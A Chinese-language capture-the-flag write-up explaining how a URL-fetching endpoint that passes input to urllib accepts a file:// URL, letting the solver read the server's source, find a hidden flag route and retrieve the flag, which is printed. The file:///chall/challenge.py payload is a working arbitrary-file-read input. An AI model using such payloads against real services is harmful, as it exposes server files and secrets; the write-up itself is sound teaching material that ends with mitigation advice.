# CaaS

## 题目简述

服务端把用户输入直接交给 `urllib.request.urlopen`。该接口不仅支持 HTTP，也支持 `file://`，因而形成任意文件读取。flag 文件名被删去，但部署中的未删减源码会泄露真实路由。

## 解题过程

先在 `/curl` 提交：

```text
file:///chall/challenge.py
```

响应会回显部署源码，其中包含未删减的路由：

```python
@app.route('/such_a_1337_flag_file_th4t_n0_one_c4n_defnitely_f1nd_hahahaha_lollll_nooob_xDDDDDDd.txt')
def flag():
    return render_template('such_a_1337_flag_file_th4t_n0_one_c4n_defnitely_f1nd_hahahaha_lollll_nooob_xDDDDDDd.txt')
```

随后直接访问该路径，得到：

```text
n00bz{4rb1t4ry_f1le_re4d_us1ng_curl_ftw!}
```

## 方法总结

URL 抓取功能必须限制协议、目标地址和重定向。本题先利用 `file://` 读取服务器源码，再用源码定位随机化资源；不能停留在尝试常见的 `flag.txt`。
